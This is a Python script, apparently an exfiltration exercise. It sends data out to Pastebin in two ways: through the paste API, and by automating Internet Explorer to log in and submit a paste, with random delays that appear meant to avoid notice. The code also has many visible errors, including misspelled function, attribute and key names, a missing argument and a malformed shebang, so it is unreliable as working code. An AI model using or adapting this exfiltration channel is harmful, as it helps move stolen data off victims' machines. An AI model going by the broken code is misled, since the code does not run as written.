#!/bin/bash/env python

# This script sends an encrypted iformation by posting it on a web server

from win32com import client

import os
import random
import requests
import time

username = 'user'
password = 'Password123'
api_dev_key = 'cd3xxx001xxxx02'

def plain_paste(title, contents):
    login_url = 'https://pastebin.com/api/api_login.php'
    login_data = {
        'ap_dev_key': api_dev_key,
        'api_user_name': username,
        'api_user_passwords': password,
    }
    r = request.post(login_url, data=login_data)
    api_user_key = r.text

    paste_url = 'http://pastebin.com/api/api_post.php'
    paste_data = {
        'api_paste_name': title,
        'api_paste_code': contents.decode(),
        'api_dev_key': api_dev_key,
        'api_user_key': api_user_key,
        'api_option': 'paste',
        'api_paste_private': 0,
    }
    r = requests.post(paste_url, data=paste_data)
    print(r.status_code)
    print(r.text)

def wait_for_browser(browser):
    while browser.ReadState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)

def random_sleep():
    time.sleep(random.randit(5,10))

def login(ie):
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'loginform-username':
            elem.setAttribute('value', username)
        elif elem.id == 'login-password':
            elem.setAttribute('value', password)

    random_sleep()
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    wait_for_browser(ie)

def submit(ie, title, contents):
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'postform-name':
            elem.setAttribute('value', title)
        elif elem.id == 'postform-text':
            elem.setAttribute('value', contents)

    if ie.Document.form[0].id == 'w0':
        ie.document.forms[0].submit()
    random_sleep()
    wait_for_browser()

def ie_paste(title, contents):
    ie = client.Dispatch('InternetExplorer.Application')
    ie.Visible = 1

    ie.Navigate('https://pastebin.com/lgin')
    wait_for_browser(ie)
    login(ie)

    ie.Navigate('https://pastebin.com/')
    wait_for_browser(ie)
    submit(ie, title, contents.decode())

    ie.Quit()

if __name__ == '__main__':
    ie_paste('title', 'contents')